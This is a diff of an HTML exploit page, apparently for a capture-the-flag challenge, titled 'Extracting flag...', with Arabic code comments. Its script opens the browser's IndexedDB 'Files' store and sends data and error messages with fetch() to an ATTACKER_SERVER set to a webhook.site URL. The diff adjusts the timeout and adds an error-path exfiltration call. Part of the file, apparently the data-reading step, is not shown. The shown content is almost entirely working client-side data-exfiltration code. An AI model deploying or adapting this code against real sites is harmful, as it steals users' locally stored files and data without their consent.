@@ -1,17 +1,18 @@
+<!-- extract.html -->
 <!DOCTYPE html>
 <html>
 <body>
   <h1>Extracting flag...</h1>
   <script>
     const ATTACKER_SERVER = "https://webhook.site/dd1b22f1-4217-44e2-a142-ce1825ed0b23/";
-
-    setTimeout(() => { // انتظر قليلاً للتأكد من أن كل شيء جاهز
+    // أعطه بعض الوقت للتأكد من أن كل شيء قد تم تحميله
+    setTimeout(() => { 
       try {
         const dbrequest = indexedDB.open("Files", 1);
         dbrequest.onsuccess = () => {
           const db = dbrequest.result;
           if (!db.objectStoreNames.contains("files")) {
-            fetch(`${ATTACKER_SERVER}?error=final_attempt_no_files_store`);
+            fetch(`${ATTACKER_SERVER}?error=store_still_not_found`);
             return;
           }
           const transaction = db.transaction("files", "readonly");
@@ -27,10 +28,11 @@
             });
           };
         };
+        dbrequest.onerror = () => fetch(`${ATTACKER_SERVER}?error=db_open_error`);
       } catch(e) {
-          fetch(`${ATTACKER_SERVER}?error=${encodeURIComponent(e.toString())}`);
+          fetch(`${ATTACKER_SERVER}?error=exploit_exception`);
       }
-    }, 1000);
+    }, 2000); // 2 ثانية كافية
   </script>
 </body>
 </html>
